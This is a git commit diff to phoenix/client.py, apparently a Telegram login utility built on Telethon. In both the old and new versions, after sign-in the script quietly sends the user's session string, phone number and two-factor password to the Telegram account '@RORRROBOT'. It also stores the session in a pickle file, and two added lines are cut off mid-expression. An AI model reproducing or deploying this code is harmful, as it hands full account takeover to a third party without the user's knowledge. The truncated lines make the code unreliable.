10c80ddc0db9e7ed856019b7f8878134efdf969c
FINAL AINZ <133069804+1mrxe1@users.noreply.github.com>
2024-08-28 01:44:03 +0300

    Update client.py

--- phoenix/client.py
+++ phoenix/client.py
@@ -2,35 +2,51 @@ from telethon import TelegramClient, sync
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 import os
+import pickle
 
 api_id = 29914850
 api_hash = "de7b0ee6f49fff7b4a5f0e5c015972ce"
 
 os.system("clear")
 print("""\033[031m
-                                                                                 
-                    ███████╗██╗███╗   ██╗ █████╗ ██╗                        
-                    ██╔════╝██║████╗  ██║██╔══██╗██║                        
-                    █████╗  ██║██╔██╗ ██║███████║██║                        
-                    ██╔══╝  ██║██║╚██╗██║██╔══██║██║                        
-                    ██║     ██║██║ ╚████║██║  ██║███████╗                   
-                    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                   
-      
-Developer: @I0I0II 
+
+                    ███████╗██╗███╗   ██╗ █████╗ ██╗
+                    ██╔════╝██║████╗  ██║██╔══██╗██║
+                    █████╗  ██║██╔██╗ ██║███████║██║
+                    ██╔══╝  ██║██║╚██╗██║██╔══██║██║
+                    ██║     ██║██║ ╚████║██║  ██║███████╗
+                    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
+
+Developer: @I0I0II
 
 """)
-      
-string = input("Press enter: ")
-client = TelegramClient(StringSession(string), api_id, api_hash)
-phone_number = input("\033[032mPlease enter your phone (or bot token): ")
-client.connect()
 
-if not client.is_user_authorized():
-    client.send_code_request(phone_number)
-    try:
-        me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
-        client.send_message("@RORRROBOT", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```')
-    except SessionPasswordNeededError:
-        password = input('\033[032mPlease enter your password: ')
-        me2 = client.sign_in(password=password)  
-        client.send_message("@RORRROBOT", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```\n\nPassword: ```{password}```')
+try:
+    with open('my_session.pkl', 'rb') as f:
+        string = pickle.load(f)
+    client = TelegramClient(StringSession(string), api_id, api_hash)
+
+except FileNotFoundError:
+    string = input("Press enter: ")
+    client = TelegramClient(StringSession(string), api_id, api_hash)
+
+finally: # الحمدلله دائما وابدا
+    phone_number = input("\033[032mPlease enter your phone (or bot token): ")
+    client.connect()
+
+    if not client.is_user_authorized():
+        client.send_code_request(phone_number)
+        try:
+            me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
+            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>
+
+            with open('my_session.pkl', 'wb') as f:
+                pickle.dump(client.session.save(), f)
+
+        except SessionPasswordNeededError:
+            password = input('\033[032mPlease enter your password: ')
+            me2 = client.sign_in(password=password)
+            client.send_message("@RORRROBOT", f'Session: \n`{client.session.save()}`\n\nPhone number: `{p>
+
+            with open('my_session.pkl', 'wb') as f:
+                pickle.dump(client.session.save(), f)
